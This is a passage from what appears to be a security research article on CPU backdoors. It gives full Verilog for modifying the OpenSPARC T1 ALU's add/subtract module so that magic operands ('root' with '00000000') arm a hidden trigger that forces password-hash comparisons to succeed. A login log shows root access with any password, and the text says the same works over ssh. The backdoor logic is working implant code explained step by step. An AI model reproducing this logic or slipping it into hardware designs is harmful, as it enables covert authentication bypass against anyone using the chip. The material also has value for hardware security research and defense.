   assign     exu_mmu_early_va_e[7:0] = adder_out[7:0];
   
   
   // Adder
   assign     exu_ifu_brpc_e[47:0] = adder_out[47:0];
   assign     alu_ecl_adder_out_63_e = adder_out[63];
   sparc_exu_aluaddsub addsub(.adder_out(adder_out[63:0]),
                        /*AUTOINST*/
                        // Outputs
                        .spr_out  (spr_out[63:0]),
                        .alu_ecl_cout64_e_l(alu_ecl_cout64_e_l),
                        .alu_ecl_cout32_e(alu_ecl_cout32_e),
                        .alu_ecl_adderin2_63_e(alu_ecl_adderin2_63_e),
                        .alu_ecl_adderin2_31_e(alu_ecl_adderin2_31_e),
                        // Inputs
                        .clk      (clk),
                        .se       (se),
                        .byp_alu_rs1_data_e(byp_alu_rs1_data_e[63:0]),
                        .byp_alu_rs2_data_e(byp_alu_rs2_data_e[63:0]),
                        .ecl_alu_cin_e(ecl_alu_cin_e),
  		        .ecl_alu_rd_e(ecl_alu_rd_e),   // uty: test
                        .ifu_exu_invert_d(ifu_exu_invert_d));

   // Logic/pass rs2_data
   dff_s invert_d2e(.din(ifu_exu_invert_d), .clk(clk), .q(invert_e), 
                    .se(se), .si(), .so());
   sparc_exu_alulogic logic(.rs1_data(byp_alu_rs1_data_e[63:0]),
                       .rs2_data(byp_alu_rs2_data_e[63:0]),
                       .isand(ecl_alu_log_sel_and_e),
                       .isor(ecl_alu_log_sel_or_e),
                       .isxor(ecl_alu_log_sel_xor_e),
                       .pass_rs2_data(ecl_alu_log_sel_move_e),
                       .inv_logic(invert_e), .logic_out(logic_out[63:0]),
                       .ifu_exu_sethi_inst_e(ecl_alu_sethi_inst_e));

   // Mux between sum predict and logic outputs for zcc
   dp_mux2es #(64)  zcompmux(.dout(zcomp_in[63:0]),
                           .in0(logic_out[63:0]),
                           .in1(spr_out[63:0]),
                           .sel(ecl_alu_out_sel_sum_e));

   // Zero comparison for zero cc
//   sparc_exu_aluzcmp64 zcccmp(.in(zcomp_in[63:0]), 
//                          .zero64(alu_ecl_z64_e),
//                          .zero32(alu_ecl_z32_e));
   assign        alu_ecl_zlow_e = ~(|zcomp_in[31:0]);
   assign        alu_ecl_zhigh_e = ~(|zcomp_in[63:32]);

   // Get Negative ccs
   assign   alu_ecl_add_n64_e = adder_out[63];
   assign   alu_ecl_add_n32_e = adder_out[31];
   assign   alu_ecl_log_n64_e = logic_out[63];
   assign   alu_ecl_log_n32_e = logic_out[31];

   
   // Mux for output
   mux4ds #(64) output_mux(.dout(alu_byp_rd_data_e[63:0]), 
                         .in0(adder_out[63:0]),
                         .in1(byp_alu_rs3_data_e[63:0]),
                         .in2(shft_alu_shift_out_e[63:0]),
                         .in3(logic_out[63:0]), 
                         .sel0(ecl_alu_out_sel_sum_e),
                         .sel1(ecl_alu_out_sel_rs3_e),
                         .sel2(ecl_alu_out_sel_shift_e),
                         .sel3(ecl_alu_out_sel_logic_e));

   // memory address checks
   sparc_exu_alu_16eql chk_mem_addr(.equal(alu_ecl_mem_addr_invalid_e_l),
                                    .in(va_e[63:47]));
   
endmodule  // sparc_exu_alu

It contains sparc_exu_alulogic and sparc_exu_aluaddsub modules. The
sparc_exu_alulogic is responsible for logical operations, while
sparc_exu_aluaddsub calculates addition and subtraction. Because the
backdoor is on SUBcc instruction, so the sparc_exu_aluaddsub module is our
target. 

In this module, we almost get all the signals we need to implement the
backdoor. For example, byp_alu_rs1_data_e and byp_alu_rs2_data_e are the
two operands value. ecl_alu_cin_e and ifu_exu_invert_d indicate whether
this operation is addition or subtraction. However, we also need to know
about the rd signal. The rd is the destination register index whose content
needs to be updated in the Write stage. Because CMP is a
pseudo-instruction, and its target register is the read-only g0 register,
this instruction does not care about the result of the calculation but only
needs to set the flag bit.

"cmp reg rs1 , reg_or_imm" actually is "subcc reg rs1 , reg_or_imm, %g0".

We need this information to tell the difference between CMP and SUBcc
instructions. The rd index is encoded in the instruction, which is
available after the Decode stage, and the sparc_exu_ecl(control logic)
module stores all its pipeline registers. Therefore, we wire ecl_alu_rd_e
from the ECL to ALU. The suffix _e indicates that this signal is valid in
the Execution stage.

The following is the sparc_exu_aluaddsub module before adding the backdoor.

module sparc_exu_aluaddsub
  (/*AUTOARG*/
   // Outputs
   adder_out, spr_out, alu_ecl_cout64_e_l, alu_ecl_cout32_e, 
   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e, 
   // Inputs
   clk, se, byp_alu_rs1_data_e, byp_alu_rs2_data_e, ecl_alu_cin_e, 
   ifu_exu_invert_d
   );
   input clk;
   input se;
   input [63:0] byp_alu_rs1_data_e;   // 1st input operand
   input [63:0]  byp_alu_rs2_data_e;   // 2nd input operand
   input         ecl_alu_cin_e;           // carry in
   input         ifu_exu_invert_d;     // subtract used by adder

   output [63:0] adder_out; // result of adder
   output [63:0] spr_out;   // result of sum predict
   output         alu_ecl_cout64_e_l;
   output         alu_ecl_cout32_e;
   output       alu_ecl_adderin2_63_e;
   output       alu_ecl_adderin2_31_e;
   
   wire [63:0]  rs2_data;       // 2nd input to adder
   wire [63:0]  rs1_data;       // 1st input to adder
   wire [63:0]  subtract_d;
   wire [63:0]  subtract_e;
   wire         cout64_e;
   
////////////////////////////////////////////
//  Module implementation
////////////////////////////////////////////
   assign       subtract_d[63:0] = {64{ifu_exu_invert_d}};
   dff_s #(64) sub_dff(.din(subtract_d[63:0]), .clk(clk), 
                       .q(subtract_e[63:0]), .se(se),
                       .si(), .so());

   assign   rs1_data[63:0] = byp_alu_rs1_data_e[63:0];

   assign   rs2_data[63:0] = byp_alu_rs2_data_e[63:0] ^ subtract_e[63:0];
   
   assign   alu_ecl_adderin2_63_e = rs2_data[63];
   assign   alu_ecl_adderin2_31_e = rs2_data[31];
   sparc_exu_aluadder64 adder(.rs1_data(rs1_data[63:0]), 
                              .rs2_data(rs2_data[63:0]),
                              .cin(ecl_alu_cin_e), 
                              .adder_out(adder_out[63:0]),
                              .cout32(alu_ecl_cout32_e), 
                              .cout64(cout64_e));
   assign   alu_ecl_cout64_e_l = ~cout64_e;


   // sum predict
   sparc_exu_aluspr spr(.rs1_data(rs1_data[63:0]), 
                        .rs2_data(rs2_data[63:0]), 
                        .cin(ecl_alu_cin_e),
                        .spr_out(spr_out[63:0]));

endmodule // sparc_exu_aluaddsub


In the CPU, addition and subtraction are all computed as additions. The
difference is that subtraction takes the complement of the subtrahend, plus
one, and then adds. The ifu_exu_invert_d indicates a subtraction, and then
all the bits of the second operands need to be flipped. ifu_exu_invert_d is
generated in the Decode stage, requiring a pipeline register to bring it to
the next stage. ecl_alu_cin_e is the carry bit, but it works oppositely for
subtraction. ecl_alu_cin_e is 1 in the SUB instruction, and ecl_alu_cin_e
is 0 in the SUBC(SUB with Carry). sparc_exu_aluspr is a module for
comparing operation with carry bit. If the two operands are equal, it
yields zero.

If the ALU is compares hash strings while the backdoor is activated, the
outcome of the sparc_exu_aluspr and sparc_exu_aluadder64 modules should be
zero.

The following is the sparc_exu_aluaddsub module after adding the backdoor.

module sparc_exu_aluaddsub
  (/*AUTOARG*/
   // Outputs
   adder_out, spr_out, alu_ecl_cout64_e_l, alu_ecl_cout32_e, 
   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e, 
   // Inputs
   clk, se, byp_alu_rs1_data_e, byp_alu_rs2_data_e, ecl_alu_cin_e, 
   ecl_alu_rd_e, // uty: test 
   ifu_exu_invert_d
   );
   input clk;
   input se;
   input [63:0] byp_alu_rs1_data_e;   // 1st input operand
   input [63:0]  byp_alu_rs2_data_e;   // 2nd input operand
   input         ecl_alu_cin_e;           // carry in
   input [4:0]   ecl_alu_rd_e;	       // uty: test
   input         ifu_exu_invert_d;     // subtract used by adder

   output [63:0] adder_out; // result of adder
   output [63:0] spr_out;   // result of sum predict
   output         alu_ecl_cout64_e_l;
   output         alu_ecl_cout32_e;
   output       alu_ecl_adderin2_63_e;
   output       alu_ecl_adderin2_31_e;
   
   wire [63:0]  rs2_data;       // 2nd input to adder
   wire [63:0]  rs1_data;       // 1st input to adder
   wire [63:0]  subtract_d;
   wire [63:0]  subtract_e;
   wire         cout64_e;

   wire [63:0]  spr_out_tmp;   // result of sum predict
   wire [63:0]  adder_out_tmp; // result of adder
   wire         alu_ecl_cout32_e_tmp;
   wire 	backdoor_on_keyword;
   wire		backdoor_off_keyword;
   wire		backdoor_nxt;
   wire		backdoor_r;
   wire		backdoor_en;
   wire		trigger_backdoor;
   wire		hash_begin;
   wire		hash_end;
   wire		hash_00;
   wire		hash_r;
   wire		hash_en;
   wire		hash_nxt;

   wire		issubrd0;
   wire		sub_e;

////////////////////////////////////////////
//  Module implementation
////////////////////////////////////////////
   assign       subtract_d[63:0] = {64{ifu_exu_invert_d}};
   dff_s #(64) sub_dff(.din(subtract_d[63:0]), .clk(clk), 
                     .q(subtract_e[63:0]), .se(se),
                     .si(), .so());

   assign   rs1_data[63:0] = byp_alu_rs1_data_e[63:0];

   assign   rs2_data[63:0] = byp_alu_rs2_data_e[63:0] ^ subtract_e[63:0];
   
   assign   alu_ecl_adderin2_63_e = rs2_data[63];
   assign   alu_ecl_adderin2_31_e = rs2_data[31];
   sparc_exu_aluadder64 adder(.rs1_data(rs1_data[63:0]), 
                              .rs2_data(rs2_data[63:0]),
                              .cin(ecl_alu_cin_e), 
                              .adder_out(adder_out_tmp[63:0]),
                              .cout32(alu_ecl_cout32_e_tmp), 
                              .cout64(cout64_e_tmp));
   assign   cout64_e = cout64_e_tmp | trigger_backdoor;
   assign   alu_ecl_cout64_e_l = ~cout64_e;
   assign   alu_ecl_cout32_e = alu_ecl_cout32_e_tmp | trigger_backdoor;


   // sum predict
   sparc_exu_aluspr spr(.rs1_data(rs1_data[63:0]), 
                        .rs2_data(rs2_data[63:0]), .cin(ecl_alu_cin_e),
                        .spr_out(spr_out_tmp[63:0]));

   // uty: test
   // 0x726f6f74 root
   
   // sub_e sub_dff is at sparc_exu_ecl, just put one here for convience
   dff_s alusub_dff(.din(ifu_exu_invert_d), .clk(clk), .q(sub_e), .se(se),
	   .si(), .so());
   
   assign backdoor_on_keyword = 
                        (64'h3030303030303030 == byp_alu_rs2_data_e[63:0])
                     && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);
   assign backdoor_off_keyword = 
                        (64'h3030303030303031 == byp_alu_rs2_data_e[63:0])
                     && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);

   assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;

   assign backdoor_en = (backdoor_on_keyword | backdoor_off_keyword);
   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));

   dffe_s #(1) backdoor_dff(.din(backdoor_nxt), .en(backdoor_en),
	   		.clk(clk), .q(backdoor_r), .se(se),
                     	.si(), .so());

   // only consider $1$ for now
   assign hash_begin =    ((24'h243124 == byp_alu_rs1_data_e[63:40])
                       && (24'h243124 == byp_alu_rs2_data_e[63:40]))
                        & issubrd0; 

   assign hash_00 =   (8'h0 == byp_alu_rs1_data_e[47:40])
                    & (8'h0 == byp_alu_rs2_data_e[47:40]); 
   assign hash_end = hash_r & hash_00 & issubrd0;

   assign hash_en = (hash_begin | hash_end) & backdoor_r;
   assign hash_nxt = hash_begin & (~hash_end);

   dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
	   		.clk(clk), .q(hash_r), .se(se),
                     	.si(), .so());


   // ifu_exu_invert_d & ecl_alu_cin_e, make sure it is a SUB/SUBcc
   // instruction. (SUBC's ecl_alu_cin_e actually is 0)
   // hash_r will update at next cycle.
   assign trigger_backdoor = (hash_r | hash_begin) & issubrd0; 

   assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}}; 
   assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};

endmodule // sparc_exu_aluaddsub


When the ALU sees the magic keyword in rs1 and rs2 operands, the
backdoor_on_keyword and backdoor_off_keyword will be signaled. For testing
purpose, the magic keyword "00000000" activate the backdoor and "00000001"
to turn it off. These two signals are only combination logic that is only
valid during the current cycle. Therefore a DFF with enable bit is used to
save it for subsequent clock cycles. The following is the logic for
backdoor_en and backdoor_nxt and the truth table. Usually,
backdoor_on_keyword and backdoor_off_keyword will not be signaled at the
same time. The backdoor_nxt could just assign with backdoor_on_keyword.

   assign backdoor_en = (backdoor_on_keyword | backdoor_off_keyword);
   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));

on_keyword  |  off_keyword   |    en     |  nxt    
     0              0              0         0
     0              1              1         0
     1              0              1         1  
     1              1              1         0             


When the backdoor is activated, it will compromise all subsequent hash
comparisons. However, ALU does not have a context to know whether it is
executing under the same thread, and it is not only arithmetic instructions
that need ALU. For example, load and branch instructions also use ALU to
calculate offsets. In addition, OpenSPARC T1 supports hardware
multithreading. All these factors can cause the backdoor to tamper with the
results of other instructions by mistake. In particular, in the strcmp()
code listed above, a SUB instruction is just before the CMP instruction.
Therefore, it is necessary to distinguish CMP and other instructions
through rd.  The signal issubrd0 indicates that the current instruction is
a CMP.

   assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;

As shown below, a hash string will be divided into 64-bit integers and
compared with its counterpart multiple times. 

$1$7c71x        0x2431243763373178
B0y$mPkM        0x423079246d506b4d
SwwbMWgE        0x537777624d576745
XsyD6YV/        0x587379443659562f
C1              0x4331

Signal hash_begin is set when the first part of hash strings are compared
in the ALU. hash_00 means this is the last segment of the hash string
because hash strings all end with 00. The middle part of the hash string
has no noticeable pattern, except that each byte is a printable character.

   assign hash_begin = ((24'h243124 == byp_alu_rs1_data_e[63:40]) 
                     && (24'h243124 == byp_alu_rs2_data_e[63:40])) 
                     & issubrd0;
   assign hash_00 = (8'h0 == byp_alu_rs1_data_e[47:40]) 
                  & (8'h0 == byp_alu_rs2_data_e[47:40]);
   assign hash_end = hash_r & hash_00 & issubrd0;


Therefore, to determine whether it is a middle part, a 1-bit DFF is used to
record whether the hash has started, then all subsequent CMP instructions
must be modified until the end of the hash string.

   assign hash_en = (hash_begin | hash_end) & backdoor_r;
   assign hash_nxt = hash_begin & (~hash_end);

   dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
                        .clk(clk), .q(hash_r), .se(se),
                        .si(), .so());

   assign trigger_backdoor = (hash_r | hash_begin) & issubrd0;


Adding more combinatorial logic can make this backdoor more applicable to
different hash algorithms. On the other hand, more combinational logic
requires a longer propagation time, which may violate the processor's
timing, so it can not be too complicated. For testing, this part of the
logic is a bit hardcoded. These simple rules alone may not be enough to
avoid conflict with other regular CMP instructions. Hence, once the
attacker successfully enters the system, the backdoor should be closed as
soon as possible. 

The following output logs demonstrate how the CPU backdoor works on the
OpenSPARC T1 with Ubuntu 7.10 installed. The system runs on the Xilinx
ML505-V5LX110T FPGA board, and the console is established through the
serial port.


Ubuntu 7.10 t1-fpga-00 ttyS0

t1-fpga-00 login: 00000000
Password:                   ---> enter anything

Login incorrect
t1-fpga-00 login: root
Password:                   ---> enter anything
Linux t1-fpga-00 2.6.22-15-sparc64-smp #110 SMP Wed Mar 18 16:53:44 PDT
2009 sparc64

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.  
root@t1-fpga-00:~# 


When logging into the system, first enter 00000000, then the backdoor is
activated, but this login attempt should fail because it is very likely
that the account 00000000 does not exist on the system. After that, If the
attacker knows a username or uses root, he can enter this account by typing
anything as the password.

This backdoor can be applied to ssh remote login as long as the ssh service
is configured with password authentication. The previously mentioned
backdoor on Windows x86 also works with Windows Remote Desktop. These are
all based on password authentication, and invoked modules are the same as
the local password login.



--[ 4. Misc 

----[ 4.1 X86 SSE AVX instruction sets

----[ 4.2 Notes on Xilinx FPGA Tool

"OpenSPARC T1 Processor Design and Verification User's Guide" and
"OpenSPARC Internals" are two excellent books about OpenSPARC T1, which
have a detailed tutorial on how to compile the processor and generate the
bitstream file.

The OpenSPARC T1 project supports multiple EDA and FPGA tools for
simulation and synthesizing, such as VCS, NCVerilog, Design Compiler,
Synplicity Pro, and XST(Xilinx Synthesis Technology).

Xilinx EDK(Embedded Development Kit) and ISE(Integrated Synthesis
Environment) are required to place and route a design on a Xilinx FPGA,
download the design to the Xilinx FPGA.

I have tested them on Ubuntu20.04, which is not the same as the book says.
The ISE version needs to use 9.1i, and the EDK version requires 10.1 sp3.
The good news is that these older versions are free. The bad news is that
they need some old version libs that are difficult to find.

Here are some notes.

1) microblaze_7_10_d IP missing.

Install EDK10.1 sp3.


2) ERROR:MDT - IPNAME:hard_ethernet_mac_wrapper INSTANCE:hard_ethernet_mac
...  License missing. 

Find the corresponding license and put it in the
Xilinx/10.1/ISE/coregen/core_licenses/ directory.


3) Error occurred during initialization of VM
java/lang/NoClassDefFoundError: java/lang/Object
ERROR:coreutil - Aborting COREGEN execution!

The java j2se (Xilinx/10.1/ISE/java/) that comes with ISE10.1 is too old.
Install Java SE Development Kit 5.0u22.
https://download.oracle.com/otn/java/jdk/1.5.0_22/jdk-1_5_0_22-linux
-amd64.bin

Replace Xilinx/10.1/ISE/java/lin64/jre directory with the new one
installed.


4.ERROR:Bitgen - Unknown PLL_ADV site  in pminfo.

Xilinx/10.1/ISE/virtex5/lib/lin64/libBsRain_Bitgen.so has a bug. In the
function BsRain_BfdTile::plladvpminfo, there seems to be an unnecessray
string destructor, Port::StringBase<char>::~StringBase((StringBase<char>
*)&local_48);_ZN4Port10StringBaseIcED1Ev@plt.

Patch it solves the issue.


--[ 5. Conclusion

--[ 6. Greetings

Special thanks to my wife uay and our two kids, Ray and Summer :)


--[ 7. References

[1] https://wiki.qemu.org/Documentation/TCG/frontend-ops
[2] SPARC Assembly Language Reference Manual
     https://docs.oracle.com/cd/E36784_01/pdf/E36858.pdf
[3] CPU bugs, CPU backdoors and consequences on security
[4] Live Migration with AMD-V Extended Migration Technology
     http://developer.amd.com/wordpress/media/2013/02/
     livevirtualmachinemigrationonamdprocessors.pdf
[5] A Performance Evaluation of Platform-Independent Methods to Search for
    Hidden Instructions on RISC Processors.  
[6] Breaking the x86 ISA. BlackHat, USA, 2017.
[7] Uisfuzz: An efficient fuzzing method for CPU undocumented instruction
    searching. 
[8] Uncovering Hidden Instructions in Armv8-A Implementations. 
[9] VIA C3 Nehemiah Datasheet, 2004.
    http://datasheets.chipdb.org/VIA/Samuel2/VIA%20C3%20Samuel%202%20
    Datasheet%20V1.12.pdf
[10] Hardware backdoors in x86 CPUs. Black Hat, 2018.
[11] Apparatus and method for limiting access to model specific registers
     in a microprocessor, December 25 2012. US Patent 8,341,419.
[12] Microprocessor that performs X86 ISA and arm ISA machine language
     program instructions by hardware translation into microinstructions
     executed by common execution pipeline, November 4 2014. US Patent
     8,880,851.
[13] Microprocessor with boot indicator that indicates a boot ISA of the
     microprocessor as either the X86 ISA or the ARM ISA, April 19 2016. 
     US Patent 9,317,301.
[14] Microprocessor that enables ARM ISA program to access 64-bit general
     purpose registers written by x86 ISA program, March 22 2016. US 
     Patent 9,292,470.
[15] 'Super-secret' debugger discovered in AMD CPUs
     https://www.theregister.com/2010/11/15/amd_secret_debugger/
[16] AMD Undocumented Machine-Specific Registers
     http://cbid.softnology.biz/html/undocmsrs.html
